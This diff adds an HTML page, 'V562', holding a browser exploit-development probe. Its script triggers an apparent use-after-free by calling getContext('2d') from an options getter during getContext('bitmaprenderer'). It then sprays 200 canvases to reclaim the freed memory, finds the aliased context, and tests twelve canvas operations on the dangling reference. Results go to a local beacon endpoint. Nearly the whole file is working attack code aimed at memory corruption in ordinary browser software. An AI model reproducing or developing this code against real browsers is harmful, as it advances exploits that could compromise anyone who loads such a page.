@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V562</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V562-'+tag+'?d='+encodeURIComponent(String(data).substring(0,400))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return {ctx:innerCtx, canvas:outer};
+}
+
+function massReclaim(w,h){
+  if(!w)w=10;if(!h)h=10;
+  var contexts=[];var canvases=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=w;c.height=h;
+    var ctx=c.getContext('2d');
+    ctx.lineWidth=200+i;
+    contexts.push(ctx);canvases.push(c);
+  }
+  return {contexts:contexts,canvases:canvases};
+}
+
+function lightGC(){
+  for(var g=0;g<5;g++){
+    var j=[];for(var i=0;i<2000;i++)j.push({x:i});
+    j=null;
+  }
+}
+
+b('BOOT','V562-caps');
+
+// SETUP: Single UAF + mass reclaim + GC-safe null — all proven
+var u=triggerUAF();
+var r=massReclaim(10,10);
+var lw=u.ctx.lineWidth;
+var idx=Math.round(lw-200);
+b('SETUP','aliasIdx='+idx+'|lw='+lw);
+
+// Null dangling + light GC
+u.ctx=null;u=null;
+lightGC();
+
+var ctx=r.contexts[idx];
+var cvs=r.canvases[idx];
+b('GC','survived|lw='+ctx.lineWidth);
+
+// T1: fillRect + getImageData
+(function(){
+  try{
+    ctx.fillStyle='#ff0000';
+    ctx.fillRect(0,0,5,5);
+    var px=ctx.getImageData(2,2,1,1).data;
+    b('T1','fillRect|R'+px[0]+'G'+px[1]+'B'+px[2]+'A'+px[3]);
+  }catch(e){b('T1','ERR:'+e.message)}
+})();
+
+// T2: save/restore
+(function(){
+  try{
+    ctx.lineWidth=111;
+    ctx.save();
+    ctx.lineWidth=222;
+    var inner=ctx.lineWidth;
+    ctx.restore();
+    var outer=ctx.lineWidth;
+    b('T2','save-restore|inner='+inner+'|outer='+outer+'|ok='+(inner===222&&outer===111));
+  }catch(e){b('T2','ERR:'+e.message)}
+})();
+
+// T3: toDataURL
+(function(){
+  try{
+    ctx.fillStyle='#00ff00';
+    ctx.fillRect(0,0,10,10);
+    var url=cvs.toDataURL('image/png');
+    b('T3','toDataURL|len='+url.length+'|prefix='+url.substring(0,25));
+  }catch(e){b('T3','ERR:'+e.message)}
+})();
+
+// T4: measureText
+(function(){
+  try{
+    ctx.font='20px serif';
+    var m=ctx.measureText('Hello');
+    b('T4','measureText|w='+m.width);
+  }catch(e){b('T4','ERR:'+e.message)}
+})();
+
+// T5: createImageData + putImageData
+(function(){
+  try{
+    var id=ctx.createImageData(4,4);
+    for(var i=0;i<id.data.length;i+=4){
+      id.data[i]=0;id.data[i+1]=0;id.data[i+2]=255;id.data[i+3]=255;
+    }
+    ctx.putImageData(id,0,0);
+    var chk=ctx.getImageData(0,0,1,1).data;
+    b('T5','putImageData|R'+chk[0]+'G'+chk[1]+'B'+chk[2]+'A'+chk[3]);
+  }catch(e){b('T5','ERR:'+e.message)}
+})();
+
+// T6: gradient
+(function(){
+  try{
+    var grad=ctx.createLinearGradient(0,0,10,10);
+    grad.addColorStop(0,'red');
+    grad.addColorStop(1,'blue');
+    ctx.fillStyle=grad;
+    ctx.fillRect(0,0,10,10);
+    var px=ctx.getImageData(0,0,1,1).data;
+    b('T6','gradient|R'+px[0]+'G'+px[1]+'B'+px[2]+'A'+px[3]);
+  }catch(e){b('T6','ERR:'+e.message)}
+})();
+
+// T7: .canvas property — which canvas does alias ctx point to?
+(function(){
+  try{
+    var c=ctx.canvas;
+    b('T7','canvas|tag='+c.tagName+'|w='+c.width+'|h='+c.height+'|same='+(c===cvs));
+  }catch(e){b('T7','ERR:'+e.message)}
+})();
+
+// T8: createPattern
+(function(){
+  try{
+    var pc=document.createElement('canvas');pc.width=2;pc.height=2;
+    var pctx=pc.getContext('2d');
+    pctx.fillStyle='#ff00ff';pctx.fillRect(0,0,2,2);
+    var pat=ctx.createPattern(pc,'repeat');
+    ctx.fillStyle=pat;
+    ctx.fillRect(0,0,10,10);
+    var px=ctx.getImageData(1,1,1,1).data;
+    b('T8','pattern|R'+px[0]+'G'+px[1]+'B'+px[2]+'A'+px[3]);
+  }catch(e){b('T8','ERR:'+e.message)}
+})();
+
+// T9: drawImage (draw one canvas onto alias canvas)
+(function(){
+  try{
+    var sc=document.createElement('canvas');sc.width=5;sc.height=5;
+    var sctx=sc.getContext('2d');
+    sctx.fillStyle='#ffff00';sctx.fillRect(0,0,5,5);
+    ctx.drawImage(sc,0,0);
+    var px=ctx.getImageData(2,2,1,1).data;
+    b('T9','drawImage|R'+px[0]+'G'+px[1]+'B'+px[2]+'A'+px[3]);
+  }catch(e){b('T9','ERR:'+e.message)}
+})();
+
+// T10: transform + setTransform
+(function(){
+  try{
+    ctx.setTransform(2,0,0,2,0,0);
+    ctx.fillStyle='#00ffff';
+    ctx.fillRect(0,0,3,3);
+    ctx.setTransform(1,0,0,1,0,0);
+    var px=ctx.getImageData(4,4,1,1).data;
+    b('T10','transform|R'+px[0]+'G'+px[1]+'B'+px[2]+'A'+px[3]);
+  }catch(e){b('T10','ERR:'+e.message)}
+})();
+
+// T11: Multiple save/restore depth
+(function(){
+  try{
+    ctx.lineWidth=10;
+    ctx.save();
+    ctx.lineWidth=20;
+    ctx.save();
+    ctx.lineWidth=30;
+    var d2=ctx.lineWidth;
+    ctx.restore();
+    var d1=ctx.lineWidth;
+    ctx.restore();
+    var d0=ctx.lineWidth;
+    b('T11','nested-save|d2='+d2+'|d1='+d1+'|d0='+d0+'|ok='+(d2===30&&d1===20&&d0===10));
+  }catch(e){b('T11','ERR:'+e.message)}
+})();
+
+// T12: clip path
+(function(){
+  try{
+    ctx.save();
+    ctx.beginPath();
+    ctx.rect(0,0,5,5);
+    ctx.clip();
+    ctx.fillStyle='#ffffff';
+    ctx.fillRect(0,0,10,10);
+    var inside=ctx.getImageData(2,2,1,1).data;
+    var outside=ctx.getImageData(7,7,1,1).data;
+    ctx.restore();
+    b('T12','clip|in=R'+inside[0]+'A'+inside[3]+'|out=R'+outside[0]+'A'+outside[3]);
+  }catch(e){b('T12','ERR:'+e.message)}
+})();
+
+b('DONE','V562-all-complete');
+</script>
+</body></html>
